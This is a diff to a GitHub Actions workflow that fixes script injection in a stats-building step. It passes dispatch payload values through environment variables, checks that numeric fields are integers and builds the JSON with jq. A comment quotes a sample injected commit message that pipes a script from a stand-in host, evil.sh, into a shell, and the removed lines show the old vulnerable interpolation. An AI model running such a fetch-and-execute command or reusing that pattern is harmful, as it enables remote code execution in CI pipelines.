@@ -58,47 +58,78 @@ jobs:
           token: ${{ secrets.GITHUB_TOKEN }}
 
       - name: Build stats JSON
+        # Every payload-controlled value arrives through the environment. A
+        # `${{ }}` expansion is substituted into the script *before* bash runs
+        # it, so a commit message like `"; curl evil.sh | sh; #` used to execute
+        # as code. Reading them as env vars means bash only ever sees data.
+        env:
+          IN_APPOINTMENTS: ${{ github.event.client_payload.appointments_total || inputs.appointments_total }}
+          IN_MONTHLY:      ${{ github.event.client_payload.appointments_this_month || inputs.appointments_this_month }}
+          IN_TENANTS:      ${{ github.event.client_payload.active_tenants || inputs.active_tenants }}
+          IN_TESTS:        ${{ github.event.client_payload.tests_total || inputs.tests_total }}
+          IN_COMMIT_MSG:   ${{ github.event.client_payload.last_commit_msg || inputs.last_commit_msg }}
+          IN_COMMIT_TYPE:  ${{ github.event.client_payload.commit_type }}
+          IN_VERSION:      ${{ github.event.client_payload.version }}
         run: |
-          # Get values from dispatch payload or workflow_dispatch inputs
-          APPOINTMENTS="${{ github.event.client_payload.appointments_total || inputs.appointments_total || '251' }}"
-          MONTHLY="${{ github.event.client_payload.appointments_this_month || inputs.appointments_this_month || '38' }}"
-          TENANTS="${{ github.event.client_payload.active_tenants || inputs.active_tenants || '4' }}"
-          TESTS="${{ github.event.client_payload.tests_total || inputs.tests_total || '1600' }}"
-          COMMIT_MSG="${{ github.event.client_payload.last_commit_msg || inputs.last_commit_msg || 'Update' }}"
-          COMMIT_TYPE="${{ github.event.client_payload.commit_type || 'feat' }}"
-          VERSION="${{ github.event.client_payload.version || '1.0.0' }}"
-          NOW=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
-          DATE=$(date -u +"%Y-%m-%d")
+          set -euo pipefail
 
-          # Read existing changelog (keep last 9 entries, prepend new one)
-          if [ -f cronix-stats.json ]; then
-            EXISTING_CHANGELOG=$(jq '.changelog // []' cronix-stats.json)
-          else
-            EXISTING_CHANGELOG='[]'
-          fi
+          [ -f cronix-stats.json ] || echo '{}' > cronix-stats.json
 
-          NEW_ENTRY="{\"date\":\"$DATE\",\"type\":\"$COMMIT_TYPE\",\"msg\":\"$COMMIT_MSG\"}"
-          CHANGELOG=$(echo "$EXISTING_CHANGELOG" | jq --argjson entry "$NEW_ENTRY" '[$entry] + . | .[0:9]')
-
-          cat > cronix-stats.json << EOF
-          {
-            "appointments_total": $APPOINTMENTS,
-            "appointments_this_month": $MONTHLY,
-            "active_tenants": $TENANTS,
-            "uptime_pct": 99.8,
-            "tests_total": $TESTS,
-            "rls_policies": 59,
-            "rls_tables": 32,
-            "edge_functions": 9,
-            "anti_hallucination_layers": 6,
-            "anti_hallucination_mechanisms": 13,
-            "ci_checks": 138,
-            "version": "$VERSION",
-            "last_updated": "$NOW",
-            "last_commit_msg": "$COMMIT_MSG",
-            "changelog": $CHANGELOG
+          # Keep the stored figure when the payload omits a field or sends
+          # something that is not a plain integer. Hardcoded fallbacks used to
+          # live here and silently rewrote real numbers with stale ones; the
+          # file itself is the better default.
+          keep_number() {
+            local incoming="$1" path="$2" seed="$3" stored
+            stored=$(jq -r "$path // $seed" cronix-stats.json)
+            case "$incoming" in
+              ''|*[!0-9]*) printf '%s' "$stored" ;;
+              *)           printf '%s' "$incoming" ;;
+            esac
           }
-          EOF
+
+          APPOINTMENTS=$(keep_number "${IN_APPOINTMENTS:-}" '.appointments_total'       251)
+          MONTHLY=$(keep_number      "${IN_MONTHLY:-}"      '.appointments_this_month'  38)
+          TENANTS=$(keep_number      "${IN_TENANTS:-}"      '.active_tenants'           4)
+          TESTS=$(keep_number        "${IN_TESTS:-}"        '.tests_total'              1600)
+
+          # Only the first line of a commit message belongs in a changelog entry.
+          COMMIT_MSG=$(printf '%s' "${IN_COMMIT_MSG:-Update}" | head -1)
+
+          # jq emits every string field, so quotes, backslashes or newlines in
+          # the commit message cannot break the document — the old version built
+          # the JSON by concatenating strings and a single quote corrupted it.
+          jq -n \
+            --argjson appointments "$APPOINTMENTS" \
+            --argjson monthly      "$MONTHLY" \
+            --argjson tenants      "$TENANTS" \
+            --argjson tests        "$TESTS" \
+            --arg     version      "${IN_VERSION:-1.0.0}" \
+            --arg     commit_msg   "$COMMIT_MSG" \
+            --arg     commit_type  "${IN_COMMIT_TYPE:-feat}" \
+            --arg     now          "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
+            --arg     day          "$(date -u +%Y-%m-%d)" \
+            --argjson changelog    "$(jq '.changelog // []' cronix-stats.json)" \
+            '{
+              appointments_total:            $appointments,
+              appointments_this_month:       $monthly,
+              active_tenants:                $tenants,
+              uptime_pct:                    99.8,
+              tests_total:                   $tests,
+              rls_policies:                  59,
+              rls_tables:                    32,
+              edge_functions:                9,
+              anti_hallucination_layers:     6,
+              anti_hallucination_mechanisms: 13,
+              ci_checks:                     138,
+              version:                       $version,
+              last_updated:                  $now,
+              last_commit_msg:               $commit_msg,
+              changelog: ([{date: $day, type: $commit_type, msg: $commit_msg}] + $changelog)[0:9]
+            }' > cronix-stats.json.tmp
+
+          mv cronix-stats.json.tmp cronix-stats.json
+          jq empty cronix-stats.json   # fail loudly rather than commit broken JSON
 
       - name: Commit updated stats
         run: |
